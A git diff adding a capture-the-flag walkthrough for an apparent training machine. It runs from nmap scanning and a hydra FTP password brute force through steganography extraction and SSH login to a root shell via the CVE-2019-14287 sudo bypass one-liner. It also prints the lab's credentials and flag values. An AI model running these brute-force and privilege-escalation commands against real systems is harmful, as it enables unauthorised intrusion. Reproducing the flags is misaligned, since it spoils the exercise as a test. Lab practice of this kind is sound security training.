@@ -1,0 +1,117 @@
+nmap -sS ip
+nmap -A ip
+#three open ports 
+ftp
+ssh
+http
+
+
+#go with http
+http://ip
+
+
+#use burpsuite
+#change as user-agent:C from hint
+#got respose agent_C_attention.php
+#now request for agent_C_attention.php
+
+Attention chris,
+
+Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!
+
+
+#now we got username as chris 
+#use hydra to bruteforce ftp port
+hydra -l chris -P ~/Desktop/rockyou.txt ip ftp
+
+
+#got password
+#username:chris
+#password:crystal
+
+ftp ip
+#login with above credential
+#found three files
+get cutie.png
+get cute-alien.jpeg
+get To_agentJ.txt
+
+
+#look for To_agentJ.txt
+
+Dear agent J,
+
+All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
+
+From,
+Agent C
+
+
+#cutie.png has a zip file inside the image 
+#use binwalk to extract the zip file
+
+binwalk cutie.png -e
+
+#extracted with in the folder _cutie.png.extracted
+cd _cutie.png.extracted
+
+#8702.zip file and To_agentR.txt
+cat To_agentR.txt
+
+
+Agent C,
+
+We need to send the picture to 'QXJlYTUx' as soon as possible!
+
+By,
+Agent R
+
+
+#the single quoted text is a base64 hash 
+echo 'QXJlYTUx' | base64 -d
+Area51
+
+#it is the password to extract data from the file cute-alien.jpeg
+steghide extract -sf cute-alien.jpg -xf data.txt
+cat data.txt
+
+
+Hi james,
+
+Glad you find this message. Your login password is hackerrules!
+
+Don't ask me why the password look cheesy, ask agent R who set this password for you.
+
+Your buddy,
+chris
+
+#here new agent is james and have ssh password is hackerrules!
+#ss
+#username:james
+#password:hackerrules!
+
+#got the user_flag
+cat user_flag.txt
+b03d975e8c92a7c04146cfa7a5a313c7
+
+#image Alien_autospy.jpeg
+#to get image to your machine
+#victim machine
+python3 -m http.server
+
+#attack machine
+http://ip:port/Alien_autospy.jpeg
+
+#google search about the image
+#Roswell Alien Autopsy
+
+#check sudo
+sudo -l
+#check sudo version
+sudo -V
+#sudo version 1.8.21p2
+#CVE-2019-14287
+sudo -u \#$((0xffffffff)) /bin/bash
+cat root.txt
+b53a02f55b57d4439e3341834d70c062
+
